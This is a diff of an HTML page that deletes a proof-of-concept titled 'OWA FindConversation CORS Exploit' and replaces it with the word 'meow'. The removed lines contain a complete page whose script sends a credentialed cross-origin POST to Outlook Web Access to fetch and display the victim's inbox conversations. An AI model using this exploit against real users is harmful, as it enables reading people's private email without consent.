@@ -1,43 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>OWA FindConversation CORS Exploit</title>
+  <title>meow</title>
 </head>
 <body>
-  <h1>Exploit: POST to FindConversation</h1>
-  <button onclick="exploit()">Send Exploit Request</button>
-
-  <pre id="output">Waiting...</pre>
-
-  <script>
-    function exploit() {
-      fetch("https://outlook.office365.com/owa/service.svc?action=FindConversation&app=Mail&n=76", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          SortOrder: "Descending",
-          ViewFilter: "All",
-          FolderId: {
-            Id: "inbox"
-          }
-        })
-      })
-      .then(response => {
-        if (!response.ok) {
-          throw new Error("Request failed: " + response.status);
-        }
-        return response.text();
-      })
-      .then(data => {
-        document.getElementById("output").textContent = "Response:\n" + data;
-      })
-      .catch(error => {
-        document.getElementById("output").textContent = "Error:\n" + error.message;
-      });
-    }
-  </script>
+ meow
 </body>
 </html>
